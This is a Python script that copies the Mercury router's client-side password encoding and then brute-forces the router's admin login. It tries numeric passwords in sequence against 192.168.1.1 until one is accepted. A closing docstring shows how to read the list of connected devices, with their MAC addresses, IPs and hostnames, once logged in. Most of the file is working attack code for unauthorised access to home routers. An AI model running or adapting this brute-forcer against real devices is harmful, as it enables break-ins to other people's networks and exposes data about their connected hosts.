# coding=utf-8

import requests
import json

__author__ = 'quinnpan'


def seurityEncode(password):
    '''
    首先，mercury的密码加密方式
    这个函数是参照Mercury路由器的js脚本写的，拿到手的几个路由器的start参数和字典都是一样的
    似乎并没有别的机制初始化starDe和dic
    '''
    output = ""
    start = "RDpbLfCPsJZ7fiv"
    dic = ("yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciX"
           "TysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgML"
           "wygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3"
           "sfQ1xtXcPcf1aT303wAQhv66qzW")

    lens = max(len(start), len(password))
    for i in range(lens):
        cl = 0xBB
        cr = 0xBB
        if i >= len(start):
            cr = ord(password[i])
        elif i >= len(password):
            cl = ord(start[i])
        else:
            cl = ord(start[i])
            cr = ord(password[i])
        output += dic[(cl ^ cr) % len(dic)]

    return output


def main():
    url = 'http://192.168.1.1/'
    headers = {'Content-Type': 'application/json; charset=UTF-8'}

    pwd1 = seurityEncode('1234')
    print(pwd1)
    pwd1 = seurityEncode('1111')
    print(pwd1)

    text_file = open("Output.txt", "w")

    password = 100000
    while password < 99999999999:
        encryptPwd = seurityEncode(str(password))
        print(encryptPwd)

        payload = '{"method":"do","login":{"password":"%s"}}' % encryptPwd
        response = requests.post(url, data = payload, headers = headers)
        print(response)
        if password % 100 == 0:
            text_file.write(str(password))

        if response.status_code == 401:
            print("failure")
        else:
            print("success", password)
            return

        password = password + 1

    text_file.close()


#    stok = json.loads(response.text)['stok']


if __name__ == '__main__':
    main()


def getNetInfo():
    '''
    获取数据代码：
stok = json.loads(response.text)['stok']
headers = {'Content-Type': 'application/json; charset=UTF-8'}
url = '%sstok=%s/ds' % ('http://192.168.1.1/',stok)
payload = '{"hosts_info":{"table":"host_info"},"method":"get"}'
response = requests.post(url, data=payload, headers=headers)
​

返回的 JSON 数据：

{
    "hosts_info": {
        "host_info": [
            {
                "host_info_1": {
                    "mac": "D4-45-9D-62-8E-2D",
                    "up_speed": "45773",
                    "ssid": "",
                    "plan_rule": [],
                    "ip": "192.168.1.100",
                    "type": "0",
                    "is_cur_host": "0",
                    "cfg_valid": "1",
                    "blocked": "0",
                    "down_limit": "0",
                    "down_speed": "808",
                    "hostname": "hehe",
                    "up_limit": "0"
                }
            },
            {
                "host_info_2": {
                    "mac": "5A-54-33-0C-92-2D",
                    "up_speed": "59",
                    "ssid": "aaa",
                    "plan_rule": [],
                    "wifi_mode": "0",
                    "ip": "192.168.1.98",
                    "type": "1",
                    "is_cur_host": "1",
                    "cfg_valid": "1",
                    "blocked": "0",
                    "down_limit": "0",
                    "down_speed": "70",
                    "hostname": "HaHa",
                    "up_limit": "0"
                }
            }
        ]
    },
    "error_code": 0
}

    :return:
    '''